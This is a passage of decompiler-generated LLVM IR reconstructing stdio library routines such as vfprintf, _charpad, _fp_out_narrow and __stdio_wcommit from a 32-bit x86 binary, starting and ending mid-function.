  %v2_805c85c = inttoptr i32 %v1_805c85c to i32*
  %v3_805c85c = load i32, i32* %v2_805c85c, align 4
  store i32 %v3_805c85c, i32* %eax.global-to-local, align 4
  %v1_805c85f = inttoptr i32 %v0_805c85c to i16*
  store i16 48, i16* %v1_805c85f, align 2
  %v0_805c864 = load i32, i32* %eax.global-to-local, align 4
  %v1_805c864 = load i32, i32* @ebx, align 4
  %v2_805c864 = add i32 %v1_805c864, 24
  %v3_805c864 = inttoptr i32 %v2_805c864 to i32*
  store i32 %v0_805c864, i32* %v3_805c864, align 4
  %v0_805c867 = load i32, i32* %eax.global-to-local, align 4
  %v1_805c867 = load i32, i32* @ebx, align 4
  %v2_805c867 = add i32 %v1_805c867, 28
  %v3_805c867 = inttoptr i32 %v2_805c867 to i32*
  store i32 %v0_805c867, i32* %v3_805c867, align 4
  %v0_805c86a = load i32, i32* %eax.global-to-local, align 4
  %v1_805c86a = load i32, i32* @ebx, align 4
  %v2_805c86a = add i32 %v1_805c86a, 16
  %v3_805c86a = inttoptr i32 %v2_805c86a to i32*
  store i32 %v0_805c86a, i32* %v3_805c86a, align 4
  %v0_805c86d = load i32, i32* %eax.global-to-local, align 4
  %v1_805c86d = load i32, i32* @ebx, align 4
  %v2_805c86d = add i32 %v1_805c86d, 20
  %v3_805c86d = inttoptr i32 %v2_805c86d to i32*
  store i32 %v0_805c86d, i32* %v3_805c86d, align 4
  br label %dec_label_pc_805c870

dec_label_pc_805c870:                             ; preds = %dec_label_pc_805c849, %dec_label_pc_805c85c
  %v0_805c873 = load i32, i32* @ebx, align 4
  %v1_805c873 = add i32 %v0_805c873, 52
  %v2_805c873 = inttoptr i32 %v1_805c873 to i32*
  store i32 1, i32* %v2_805c873, align 4
  %v0_805c87a = load i32, i32* @esi, align 4
  %v2_805c87b = call i32 @__stdio_init_mutex(i32 %v0_805c87a)
  store i32 %v2_805c87b, i32* %eax.global-to-local, align 4
  %v0_805c880 = load i32, i32* @ebx, align 4
  %v1_805c880 = add i32 %v0_805c880, 32
  %v2_805c880 = inttoptr i32 %v1_805c880 to i32*
  %storemerge = load i32, i32* %v2_805c880, align 4
  store i32 %storemerge, i32* @ebx, align 4
  %v1_805c886 = icmp eq i32 %storemerge, 0
  %v1_805c888 = icmp eq i1 %v1_805c886, false
  br i1 %v1_805c888, label %dec_label_pc_805c849, label %dec_label_pc_805c883.dec_label_pc_805c8a6.preheader_crit_edge

dec_label_pc_805c883.dec_label_pc_805c8a6.preheader_crit_edge: ; preds = %dec_label_pc_805c870
  %storemerge23.pre = load i32, i32* bitcast (i32** @global_var_80753fc.617 to i32*), align 4
  br label %dec_label_pc_805c8a6.preheader

dec_label_pc_805c8a6.preheader:                   ; preds = %dec_label_pc_805c883.dec_label_pc_805c8a6.preheader_crit_edge, %entry
  %storemerge23 = phi i32 [ %storemerge23.pre, %dec_label_pc_805c883.dec_label_pc_805c8a6.preheader_crit_edge ], [ %storemerge22, %entry ]
  store i32 %storemerge23, i32* @ebx, align 4
  %v1_805c8a64 = icmp eq i32 %storemerge23, 0
  %v1_805c8a811 = icmp eq i1 %v1_805c8a64, false
  br i1 %v1_805c8a811, label %dec_label_pc_805c892.preheader, label %dec_label_pc_805c8aa

dec_label_pc_805c892.preheader:                   ; preds = %dec_label_pc_805c8a6.preheader
  br label %dec_label_pc_805c892

dec_label_pc_805c892:                             ; preds = %dec_label_pc_805c892.preheader, %dec_label_pc_805c8a3
  %v0_805c89a = phi i32 [ %storemerge2, %dec_label_pc_805c8a3 ], [ %storemerge23, %dec_label_pc_805c892.preheader ]
  %v1_805c892 = inttoptr i32 %v0_805c89a to i8*
  %v2_805c892 = load i8, i8* %v1_805c892, align 1
  %v3_805c892 = and i8 %v2_805c892, 64
  %v4_805c892 = icmp eq i8 %v3_805c892, 0
  br i1 %v4_805c892, label %dec_label_pc_805c8a3, label %dec_label_pc_805c897

dec_label_pc_805c897:                             ; preds = %dec_label_pc_805c892
  %v2_805c89b = call i32 @__stdio_wcommit(i32 %v0_805c89a)
  store i32 %v2_805c89b, i32* %eax.global-to-local, align 4
  %v0_805c8a3.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_805c8a3

dec_label_pc_805c8a3:                             ; preds = %dec_label_pc_805c892, %dec_label_pc_805c897
  %v0_805c8a3 = phi i32 [ %v0_805c89a, %dec_label_pc_805c892 ], [ %v0_805c8a3.pre, %dec_label_pc_805c897 ]
  %v1_805c8a3 = add i32 %v0_805c8a3, 32
  %v2_805c8a3 = inttoptr i32 %v1_805c8a3 to i32*
  %storemerge2 = load i32, i32* %v2_805c8a3, align 4
  store i32 %storemerge2, i32* @ebx, align 4
  %v1_805c8a6 = icmp eq i32 %storemerge2, 0
  %v1_805c8a8 = icmp eq i1 %v1_805c8a6, false
  br i1 %v1_805c8a8, label %dec_label_pc_805c892, label %dec_label_pc_805c8aa

dec_label_pc_805c8aa:                             ; preds = %dec_label_pc_805c8a3, %dec_label_pc_805c8a6.preheader
  %v2_805c8aa = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_805c8aa, i32* %eax.global-to-local, align 4
  %v2_805c8ab = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_805c8ab, i32* @ebx, align 4
  store i32 %v0_805c826, i32* @esi, align 4
  ret i32 %v2_805c8aa

; uselistorder directives
  uselistorder i32 %storemerge2, { 1, 2, 0 }
  uselistorder i32 %storemerge23, { 2, 1, 0 }
  uselistorder i32 %storemerge, { 1, 2, 0 }
  uselistorder i32 (i32)* @__stdio_init_mutex, { 2, 1, 0, 4, 3 }
  uselistorder label %dec_label_pc_805c8a3, { 1, 0 }
  uselistorder label %dec_label_pc_805c892, { 1, 0 }
  uselistorder label %dec_label_pc_805c870, { 1, 0 }
  uselistorder label %dec_label_pc_805c849, { 1, 0 }
}

define i32 @__stdio_wcommit(i32 %arg1) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %tmp11 = call i32 @__decompiler_undefined_function_0()
  store i32 %tmp11, i32* %stack_var_-12, align 4
  %v0_805c8b0 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v1_805c8b8 = add i32 %arg1, 8
  %v2_805c8b8 = inttoptr i32 %v1_805c8b8 to i32*
  %v3_805c8b8 = load i32, i32* %v2_805c8b8, align 4
  store i32 %v3_805c8b8, i32* %edx.global-to-local, align 4
  %v1_805c8bb = add i32 %arg1, 16
  %v2_805c8bb = inttoptr i32 %v1_805c8bb to i32*
  %v3_805c8bb = load i32, i32* %v2_805c8bb, align 4
  %v2_805c8be = sub i32 %v3_805c8bb, %v3_805c8b8
  %v12_805c8be = icmp eq i32 %v2_805c8be, 0
  store i32 %v2_805c8be, i32* %eax.global-to-local, align 4
  br i1 %v12_805c8be, label %dec_label_pc_805c8d1, label %dec_label_pc_805c8c2

dec_label_pc_805c8c2:                             ; preds = %entry
  store i32 %v3_805c8b8, i32* %v2_805c8bb, align 4
  %v0_805c8c5 = load i32, i32* @ecx, align 4
  %v0_805c8c6 = load i32, i32* %eax.global-to-local, align 4
  %v0_805c8c7 = load i32, i32* %edx.global-to-local, align 4
  %v0_805c8c8 = load i32, i32* @ebx, align 4
  %v4_805c8c9 = inttoptr i32 %v0_805c8c8 to i16*
  %v5_805c8c9 = call i32 @__stdio_WRITE(i16* %v4_805c8c9, i32 %v0_805c8c7, i32 %v0_805c8c6, i32 %v0_805c8c5)
  store i32 %v5_805c8c9, i32* %eax.global-to-local, align 4
  %v0_805c8d1.pre = load i32, i32* @ebx, align 4
  %v2_805c8d7.pre = load i32, i32* %stack_var_-12, align 4
  br label %dec_label_pc_805c8d1

dec_label_pc_805c8d1:                             ; preds = %entry, %dec_label_pc_805c8c2
  %v2_805c8d7 = phi i32 [ %tmp11, %entry ], [ %v2_805c8d7.pre, %dec_label_pc_805c8c2 ]
  %v0_805c8d1 = phi i32 [ %arg1, %entry ], [ %v0_805c8d1.pre, %dec_label_pc_805c8c2 ]
  %v1_805c8d1 = add i32 %v0_805c8d1, 16
  %v2_805c8d1 = inttoptr i32 %v1_805c8d1 to i32*
  %v3_805c8d1 = load i32, i32* %v2_805c8d1, align 4
  store i32 %v3_805c8d1, i32* %eax.global-to-local, align 4
  %v2_805c8d4 = add i32 %v0_805c8d1, 8
  %v3_805c8d4 = inttoptr i32 %v2_805c8d4 to i32*
  %v4_805c8d4 = load i32, i32* %v3_805c8d4, align 4
  %v5_805c8d4 = sub i32 %v3_805c8d1, %v4_805c8d4
  store i32 %v5_805c8d4, i32* %eax.global-to-local, align 4
  store i32 %v2_805c8d7, i32* @edx, align 4
  store i32 %v0_805c8b0, i32* @ebx, align 4
  ret i32 %v5_805c8d4

; uselistorder directives
  uselistorder i32 %v0_805c8d1, { 1, 0 }
  uselistorder i32 %arg1, { 0, 3, 2, 1 }
  uselistorder label %dec_label_pc_805c8d1, { 1, 0 }
}

define i32 @__GI_vfprintf(i16* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-28 = alloca i32, align 4
  %v0_805c8dc = load i32, i32* @edi, align 4
  %v0_805c8dd = load i32, i32* @esi, align 4
  %v0_805c8de = load i32, i32* @ebx, align 4
  %v4_805c8e2 = ptrtoint i16* %arg1 to i32
  store i32 %v4_805c8e2, i32* @esi, align 4
  %v1_805c8e6 = add i32 %v4_805c8e2, 52
  %v2_805c8e6 = inttoptr i32 %v1_805c8e6 to i32*
  %v3_805c8e6 = load i32, i32* %v2_805c8e6, align 4
  store i32 %v3_805c8e6, i32* @edi, align 4
  %v1_805c8e9 = icmp eq i32 %v3_805c8e6, 0
  %v1_805c8eb = icmp eq i1 %v1_805c8e9, false
  br i1 %v1_805c8eb, label %dec_label_pc_805c90c, label %dec_label_pc_805c8ed

dec_label_pc_805c8ed:                             ; preds = %entry
  %v1_805c8ed = add i32 %v4_805c8e2, 56
  store i32 %v1_805c8ed, i32* @ebx, align 4
  %v5_805c8fc = call i32 @__pthread_cleanup_push_defer(i32* nonnull %stack_var_-28, i32 134589241, i32 %v1_805c8ed)
  %v0_805c901 = load i32, i32* @ebx, align 4
  %v2_805c904 = call i32 @pthread_mutex_lock(i32 %v0_805c901)
  %v0_805c90c.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_805c90c

dec_label_pc_805c90c:                             ; preds = %entry, %dec_label_pc_805c8ed
  %v0_805c925 = phi i32 [ %v4_805c8e2, %entry ], [ %v0_805c90c.pre, %dec_label_pc_805c8ed ]
  %v1_805c90c = inttoptr i32 %v0_805c925 to i16*
  %v2_805c90c = load i16, i16* %v1_805c90c, align 2
  %v1_805c90f = and i16 %v2_805c90c, 192
  %v6_805c914 = icmp eq i16 %v1_805c90f, 192
  br i1 %v6_805c914, label %dec_label_pc_805c90c.dec_label_pc_805c932_crit_edge, label %dec_label_pc_805c91b

dec_label_pc_805c90c.dec_label_pc_805c932_crit_edge: ; preds = %dec_label_pc_805c90c
  br label %dec_label_pc_805c932

dec_label_pc_805c91b:                             ; preds = %dec_label_pc_805c90c
  %v0_805c91b = load i32, i32* @ecx, align 4
  store i32 -1, i32* @ebx, align 4
  %v6_805c926 = call i32 @__stdio_trans2w_o(i16* %v1_805c90c, i32 128, i32 %v0_805c91b, i32 %v0_805c91b)
  %v1_805c92e = icmp eq i32 %v6_805c926, 0
  %v1_805c930 = icmp eq i1 %v1_805c92e, false
  br i1 %v1_805c930, label %dec_label_pc_805c946, label %dec_label_pc_805c91b.dec_label_pc_805c932_crit_edge

dec_label_pc_805c91b.dec_label_pc_805c932_crit_edge: ; preds = %dec_label_pc_805c91b
  %v0_805c93b.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_805c932

dec_label_pc_805c932:                             ; preds = %dec_label_pc_805c90c.dec_label_pc_805c932_crit_edge, %dec_label_pc_805c91b.dec_label_pc_805c932_crit_edge
  %v0_805c93b = phi i32 [ %v0_805c925, %dec_label_pc_805c90c.dec_label_pc_805c932_crit_edge ], [ %v0_805c93b.pre, %dec_label_pc_805c91b.dec_label_pc_805c932_crit_edge ]
  %v4_805c93c = inttoptr i32 %arg2 to i8*
  %v5_805c93c = call i32 @_vfprintf_internal(i32 %v0_805c93b, i8* %v4_805c93c, i32 %arg3)
  store i32 %v5_805c93c, i32* @ebx, align 4
  br label %dec_label_pc_805c946

dec_label_pc_805c946:                             ; preds = %dec_label_pc_805c91b, %dec_label_pc_805c932
  br i1 %v1_805c8eb, label %dec_label_pc_805c95b, label %dec_label_pc_805c94a

dec_label_pc_805c94a:                             ; preds = %dec_label_pc_805c946
  %v4_805c953 = call i32 @__pthread_cleanup_pop_restore(i32* nonnull %stack_var_-28, i32 1)
  br label %dec_label_pc_805c95b

dec_label_pc_805c95b:                             ; preds = %dec_label_pc_805c946, %dec_label_pc_805c94a
  %v0_805c95e = load i32, i32* @ebx, align 4
  store i32 %v0_805c8de, i32* @ebx, align 4
  store i32 %v0_805c8dd, i32* @esi, align 4
  store i32 %v0_805c8dc, i32* @edi, align 4
  ret i32 %v0_805c95e

; uselistorder directives
  uselistorder i32 (i32, i8*, i32)* @_vfprintf_internal, { 1, 0 }
  uselistorder label %dec_label_pc_805c95b, { 1, 0 }
  uselistorder label %dec_label_pc_805c946, { 1, 0 }
  uselistorder label %dec_label_pc_805c932, { 1, 0 }
  uselistorder label %dec_label_pc_805c90c, { 1, 0 }
}

define i32 @_charpad() local_unnamed_addr {
entry:
  %stack_var_-13 = alloca i32, align 4
  %v0_805c964 = load i32, i32* @edi, align 4
  %v0_805c965 = load i32, i32* @eax, align 4
  store i32 %v0_805c965, i32* @edi, align 4
  %v0_805c967 = load i32, i32* @esi, align 4
  %v0_805c968 = load i32, i32* @ecx, align 4
  store i32 %v0_805c968, i32* @esi, align 4
  %v0_805c96a = load i32, i32* @ebx, align 4
  store i32 %v0_805c968, i32* @ebx, align 4
  %v0_805c970 = load i32, i32* @edx, align 4
  store i32 %v0_805c970, i32* %stack_var_-13, align 4
  %v1_805c9772 = icmp eq i32 %v0_805c968, 0
  br i1 %v1_805c9772, label %dec_label_pc_805c98f, label %dec_label_pc_805c97b.lr.ph

dec_label_pc_805c97b.lr.ph:                       ; preds = %entry
  %v2_805c97b = ptrtoint i32* %stack_var_-13 to i32
  br label %dec_label_pc_805c97b

dec_label_pc_805c976:                             ; preds = %dec_label_pc_805c97b
  %v1_805c976 = add i32 %v0_805c976, -1
  %v8_805c976 = icmp eq i32 %v1_805c976, 0
  store i32 %v1_805c976, i32* @ebx, align 4
  br i1 %v8_805c976, label %dec_label_pc_805c98f.loopexit, label %dec_label_pc_805c976.dec_label_pc_805c97b_crit_edge

dec_label_pc_805c976.dec_label_pc_805c97b_crit_edge: ; preds = %dec_label_pc_805c976
  %v0_805c97f.pre = load i32, i32* @edx, align 4
  %v0_805c980.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_805c97b

dec_label_pc_805c97b:                             ; preds = %dec_label_pc_805c976.dec_label_pc_805c97b_crit_edge, %dec_label_pc_805c97b.lr.ph
  %v0_805c980 = phi i32 [ %v0_805c980.pre, %dec_label_pc_805c976.dec_label_pc_805c97b_crit_edge ], [ %v0_805c965, %dec_label_pc_805c97b.lr.ph ]
  %v0_805c97f = phi i32 [ %v0_805c97f.pre, %dec_label_pc_805c976.dec_label_pc_805c97b_crit_edge ], [ %v0_805c970, %dec_label_pc_805c97b.lr.ph ]
  %v4_805c984 = call i32 @__stdio_fwrite(i32 %v2_805c97b, i32 1, i32 %v0_805c980, i32 %v0_805c97f)
  %v8_805c98c = icmp eq i32 %v4_805c984, 1
  %v0_805c976 = load i32, i32* @ebx, align 4
  br i1 %v8_805c98c, label %dec_label_pc_805c976, label %dec_label_pc_805c98f.loopexit

dec_label_pc_805c98f.loopexit:                    ; preds = %dec_label_pc_805c976, %dec_label_pc_805c97b
  %v1_805c992.ph = phi i32 [ %v0_805c976, %dec_label_pc_805c97b ], [ 0, %dec_label_pc_805c976 ]
  %v0_805c992.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_805c98f

dec_label_pc_805c98f:                             ; preds = %dec_label_pc_805c98f.loopexit, %entry
  %v0_805c992 = phi i32 [ 0, %entry ], [ %v0_805c992.pre, %dec_label_pc_805c98f.loopexit ]
  %v1_805c992 = phi i32 [ 0, %entry ], [ %v1_805c992.ph, %dec_label_pc_805c98f.loopexit ]
  %v2_805c992 = sub i32 %v0_805c992, %v1_805c992
  store i32 %v0_805c96a, i32* @ebx, align 4
  store i32 %v0_805c967, i32* @esi, align 4
  store i32 %v0_805c964, i32* @edi, align 4
  ret i32 %v2_805c992

; uselistorder directives
  uselistorder i32 %v1_805c976, { 1, 0 }
  uselistorder i32* %stack_var_-13, { 1, 0 }
  uselistorder label %dec_label_pc_805c98f.loopexit, { 1, 0 }
}

define i32 @_fp_out_narrow(i32 %arg1, i32 %arg2, i32 %arg3, i8* %arg4) local_unnamed_addr {
entry:
  store i32 0, i32* @ebp, align 4
  store i32 %arg2, i32* @edi, align 4
  store i32 %arg3, i32* @ebx, align 4
  %v3_805c9ad = trunc i32 %arg2 to i8
  %v5_805c9ad = icmp slt i8 %v3_805c9ad, 0
  %v1_805c9af = icmp eq i1 %v5_805c9ad, false
  %tmp20 = ptrtoint i8* %arg4 to i32
  br i1 %v1_805c9af, label %dec_label_pc_805c9e0, label %dec_label_pc_805c9b1

dec_label_pc_805c9b1:                             ; preds = %entry
  %v3_805c9b8 = call i32 @strlen(i8* %arg4)
  %v0_805c9c0 = load i32, i32* @ebx, align 4
  %v2_805c9c0 = sub i32 %v0_805c9c0, %v3_805c9b8
  store i32 %v2_805c9c0, i32* @ebx, align 4
  store i32 %v3_805c9b8, i32* @esi, align 4
  %tmp22 = icmp slt i32 %v2_805c9c0, 1
  br i1 %tmp22, label %dec_label_pc_805c9de, label %dec_label_pc_805c9c8

dec_label_pc_805c9c8:                             ; preds = %dec_label_pc_805c9b1
  store i32 %arg1, i32* @eax, align 4
  %v0_805c9cc = load i32, i32* @edi, align 4
  %v1_805c9cc = urem i32 %v0_805c9cc, 128
  store i32 %v1_805c9cc, i32* @edi, align 4
  store i32 %v2_805c9c0, i32* @ecx, align 4
  store i32 %v1_805c9cc, i32* @edx, align 4
  %v0_805c9d3 = call i32 @_charpad()
  %v12_805c9d8 = icmp eq i32 %v0_805c9d3, %v2_805c9c0
  store i32 %v0_805c9d3, i32* @ebp, align 4
  %v1_805c9dc = icmp eq i1 %v12_805c9d8, false
  br i1 %v1_805c9dc, label %dec_label_pc_805c9fa, label %dec_label_pc_805c9c8.dec_label_pc_805c9de_crit_edge

dec_label_pc_805c9c8.dec_label_pc_805c9de_crit_edge: ; preds = %dec_label_pc_805c9c8
  %v0_805c9de.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_805c9de

dec_label_pc_805c9de:                             ; preds = %dec_label_pc_805c9c8.dec_label_pc_805c9de_crit_edge, %dec_label_pc_805c9b1
  %v0_805c9de = phi i32 [ %v0_805c9de.pre, %dec_label_pc_805c9c8.dec_label_pc_805c9de_crit_edge ], [ %v3_805c9b8, %dec_label_pc_805c9b1 ]
  store i32 %v0_805c9de, i32* @ebx, align 4
  br label %dec_label_pc_805c9e0

dec_label_pc_805c9e0:                             ; preds = %entry, %dec_label_pc_805c9de
  %v0_805c9eb = phi i32 [ %arg3, %entry ], [ %v0_805c9de, %dec_label_pc_805c9de ]
  %tmp23 = icmp slt i32 %v0_805c9eb, 1
  br i1 %tmp23, label %dec_label_pc_805c9f8, label %dec_label_pc_805c9e6

dec_label_pc_805c9e6:                             ; preds = %dec_label_pc_805c9e0
  %v0_805c9e6 = load i32, i32* @ecx, align 4
  %v5_805c9f0 = call i32 @__stdio_fwrite(i32 %tmp20, i32 %v0_805c9eb, i32 %arg1, i32 %v0_805c9e6)
  br label %dec_label_pc_805c9f8

dec_label_pc_805c9f8:                             ; preds = %dec_label_pc_805c9e0, %dec_label_pc_805c9e6
  %v1_805c9f8 = phi i32 [ 0, %dec_label_pc_805c9e0 ], [ %v5_805c9f0, %dec_label_pc_805c9e6 ]
  %v0_805c9f8 = load i32, i32* @ebp, align 4
  %v2_805c9f8 = add i32 %v0_805c9f8, %v1_805c9f8
  br label %dec_label_pc_805c9fa

dec_label_pc_805c9fa:                             ; preds = %dec_label_pc_805c9c8, %dec_label_pc_805c9f8
  %v0_805c9fd = phi i32 [ %v0_805c9d3, %dec_label_pc_805c9c8 ], [ %v2_805c9f8, %dec_label_pc_805c9f8 ]
  ret i32 %v0_805c9fd

; uselistorder directives
  uselistorder i32 %v0_805c9eb, { 1, 0 }
  uselistorder i32 %v0_805c9d3, { 1, 2, 0 }
  uselistorder i32 %v1_805c9cc, { 1, 0 }
  uselistorder i32 %v2_805c9c0, { 0, 2, 1, 3 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_805c9fa, { 1, 0 }
  uselistorder label %dec_label_pc_805c9f8, { 1, 0 }
  uselistorder label %dec_label_pc_805c9e0, { 1, 0 }
}

define i32 @_vfprintf_internal(i32 %arg1, i8* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %sf.global-to-local = alloca i1, align 1
  %st0.global-to-local = alloca x86_fp80, align 4
  %stack_var_-364 = alloca i32, align 4
  %stack_var_-348 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_805ca07 = load i32, i32* @ebx, align 4
  store i32 %v0_805ca07, i32* %stack_var_-16, align 4
  %v4_805ca07 = ptrtoint i32* %stack_var_-16 to i32
  %v1_805ca08 = add i32 %v4_805ca07, -356
  %v10_805ca08 = icmp slt i32 %v1_805ca08, 0
  store i1 %v10_805ca08, i1* %sf.global-to-local, align 1
  %v4_805ca0e = ptrtoint i8* %arg2 to i32
  store i32 %v4_805ca0e, i32* @ebx, align 4
  %v2_805ca16 = ptrtoint i32* %stack_var_-348 to i32
  store i32 %v2_805ca16, i32* @esi, align 4
  %v5_805ca1b = call i32 @_ppfs_init(i32* nonnull %stack_var_-348, i32 %v4_805ca0e)
  store i32 %v5_805ca1b, i32* %eax.global-to-local, align 4
  %v2_805ca23 = icmp slt i32 %v5_805ca1b, 0
  store i1 %v2_805ca23, i1* %sf.global-to-local, align 1
  %v1_805ca25 = icmp eq i1 %v2_805ca23, false
  br i1 %v1_805ca25, label %dec_label_pc_805ca65, label %dec_label_pc_805ca27

dec_label_pc_805ca27:                             ; preds = %entry
  %v12_805ca20 = ptrtoint i32* %stack_var_-364 to i32
  %v3_805ca27 = load i32, i32* %stack_var_-348, align 4
  store i32 %v3_805ca27, i32* @ebx, align 4
  %v1_805ca2b = add i32 %v12_805ca20, -12
  %v10_805ca2b = icmp slt i32 %v1_805ca2b, 0
  store i1 %v10_805ca2b, i1* %sf.global-to-local, align 1
  %v5_805ca2e = inttoptr i32 %v3_805ca27 to i8*
  %v3_805ca2f = call i32 @strlen(i8* %v5_805ca2e)
  store i32 %v3_805ca2f, i32* %eax.global-to-local, align 4
  store i32 -1, i32* %stack_var_-364, align 4
  %v1_805ca3e = icmp eq i32 %v3_805ca2f, 0
  %v2_805ca3e = icmp slt i32 %v3_805ca2f, 0
  store i1 %v2_805ca3e, i1* %sf.global-to-local, align 1
  br i1 %v1_805ca3e, label %dec_label_pc_805cfae, label %dec_label_pc_805ca46

dec_label_pc_805ca46:                             ; preds = %dec_label_pc_805ca27
  %v0_805ca46 = load i32, i32* @edx, align 4
  %v0_805ca4f = load i32, i32* @ebx, align 4
  %v6_805ca50 = call i32 @__stdio_fwrite(i32 %v0_805ca4f, i32 %v3_805ca2f, i32 %arg1, i32 %v0_805ca46)
  store i32 %v6_805ca50, i32* %eax.global-to-local, align 4
  store i32 -1, i32* %stack_var_-364, align 4
  %v0_805ca5d = load i32, i32* @esp, align 4
  %v1_805ca5d = add i32 %v0_805ca5d, 16
  %v7_805ca5d = icmp slt i32 %v1_805ca5d, 0
  store i1 %v7_805ca5d, i1* %sf.global-to-local, align 1
  br label %dec_label_pc_805cfae

dec_label_pc_805ca65:                             ; preds = %entry
  %v6_805ca6f = call i32 @_ppfs_prepargs(i32 %v2_805ca16, i32 %arg3, i32 %v5_805ca1b, i32 %v5_805ca1b)
  store i32 %v6_805ca6f, i32* %eax.global-to-local, align 4
  %v0_805ca74 = load i32, i32* @ebx, align 4
  store i32 %v0_805ca74, i32* %edx.global-to-local, align 4
  store i32 0, i32* %stack_var_-364, align 4
  %v0_805ca7e = load i32, i32* @esp, align 4
  %v1_805ca7e = add i32 %v0_805ca7e, 16
  %v7_805ca7e = icmp slt i32 %v1_805ca7e, 0
  store i1 %v7_805ca7e, i1* %sf.global-to-local, align 1
  br label %dec_label_pc_805ca84

dec_label_pc_805ca83:                             ; preds = %dec_label_pc_805ca8a
  %v1_805ca83 = add i32 %v0_805ca92, 1
  %v9_805ca83 = icmp slt i32 %v1_805ca83, 0
  store i1 %v9_805ca83, i1* %sf.global-to-local, align 1
  store i32 %v1_805ca83, i32* @ebx, align 4
  br label %dec_label_pc_805ca84.backedge

dec_label_pc_805ca84.backedge:                    ; preds = %dec_label_pc_805ca83, %dec_label_pc_805cf94, %dec_label_pc_805cf9f
  %v1_805ca8e22 = phi i32 [ %v1_805ca96, %dec_label_pc_805ca83 ], [ %v3_805cf94, %dec_label_pc_805cf94 ], [ %v1_805cac2, %dec_label_pc_805cf9f ]
  %v0_805ca8420 = phi i32 [ %v1_805ca83, %dec_label_pc_805ca83 ], [ %v3_805cf94, %dec_label_pc_805cf94 ], [ %v1_805cf9f, %dec_label_pc_805cf9f ]
  %v4_805ca84.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805ca84

dec_label_pc_805ca84:                             ; preds = %dec_label_pc_805ca84.backedge, %dec_label_pc_805ca65
  %v1_805ca96 = phi i32 [ %v1_805ca8e22, %dec_label_pc_805ca84.backedge ], [ %v0_805ca74, %dec_label_pc_805ca65 ]
  %v0_805ca92 = phi i32 [ %v0_805ca8420, %dec_label_pc_805ca84.backedge ], [ %v0_805ca74, %dec_label_pc_805ca65 ]
  %v4_805ca84 = phi i32 [ %v4_805ca84.pre, %dec_label_pc_805ca84.backedge ], [ %v6_805ca6f, %dec_label_pc_805ca65 ]
  %v1_805ca84 = inttoptr i32 %v0_805ca92 to i8*
  %v2_805ca84 = load i8, i8* %v1_805ca84, align 1
  %v3_805ca84 = zext i8 %v2_805ca84 to i32
  %v5_805ca84 = and i32 %v4_805ca84, -256
  %v6_805ca84 = or i32 %v3_805ca84, %v5_805ca84
  store i32 %v6_805ca84, i32* %eax.global-to-local, align 4
  %v4_805ca86 = icmp eq i8 %v2_805ca84, 0
  %v5_805ca86 = icmp slt i8 %v2_805ca84, 0
  store i1 %v5_805ca86, i1* %sf.global-to-local, align 1
  br i1 %v4_805ca86, label %dec_label_pc_805ca8e, label %dec_label_pc_805ca8a

dec_label_pc_805ca8a:                             ; preds = %dec_label_pc_805ca84
  %v2_805ca8a = add i8 %v2_805ca84, -37
  %v10_805ca8a = icmp eq i8 %v2_805ca8a, 0
  %v11_805ca8a = icmp slt i8 %v2_805ca8a, 0
  store i1 %v11_805ca8a, i1* %sf.global-to-local, align 1
  %v1_805ca8c = icmp eq i1 %v10_805ca8a, false
  br i1 %v1_805ca8c, label %dec_label_pc_805ca83, label %dec_label_pc_805ca8e

dec_label_pc_805ca8e:                             ; preds = %dec_label_pc_805ca8a, %dec_label_pc_805ca84
  %v2_805ca8e = sub i32 %v0_805ca92, %v1_805ca96
  %v12_805ca8e = icmp eq i32 %v2_805ca8e, 0
  %v13_805ca8e = icmp slt i32 %v2_805ca8e, 0
  store i1 %v13_805ca8e, i1* %sf.global-to-local, align 1
  br i1 %v12_805ca8e, label %dec_label_pc_805cab9, label %dec_label_pc_805ca92

dec_label_pc_805ca92:                             ; preds = %dec_label_pc_805ca8e
  store i32 0, i32* %eax.global-to-local, align 4
  store i32 %v2_805ca8e, i32* @esi, align 4
  store i1 %v13_805ca8e, i1* %sf.global-to-local, align 1
  %tmp67 = icmp slt i32 %v2_805ca8e, 1
  br i1 %tmp67, label %dec_label_pc_805caae, label %dec_label_pc_805ca9c

dec_label_pc_805ca9c:                             ; preds = %dec_label_pc_805ca92
  %v0_805ca9c = load i32, i32* @ebp, align 4
  %v1_805ca9c = load i32, i32* @esp, align 4
  %v2_805ca9c = add i32 %v1_805ca9c, -4
  %v3_805ca9c = inttoptr i32 %v2_805ca9c to i32*
  store i32 %v0_805ca9c, i32* %v3_805ca9c, align 4
  %v1_805ca9d = add i32 %v1_805ca9c, 368
  %v2_805ca9d = inttoptr i32 %v1_805ca9d to i32*
  %v3_805ca9d = load i32, i32* %v2_805ca9d, align 4
  %v5_805ca9d = add i32 %v1_805ca9c, -8
  %v6_805ca9d = inttoptr i32 %v5_805ca9d to i32*
  store i32 %v3_805ca9d, i32* %v6_805ca9d, align 4
  %v0_805caa4 = load i32, i32* @esi, align 4
  %v2_805caa4 = add i32 %v1_805ca9c, -12
  %v3_805caa4 = inttoptr i32 %v2_805caa4 to i32*
  store i32 %v0_805caa4, i32* %v3_805caa4, align 4
  %v0_805caa5 = load i32, i32* %edx.global-to-local, align 4
  %v2_805caa5 = add i32 %v1_805ca9c, -16
  %v3_805caa5 = inttoptr i32 %v2_805caa5 to i32*
  store i32 %v0_805caa5, i32* %v3_805caa5, align 4
  %v0_805caa6 = load i32, i32* %stack_var_-364, align 4
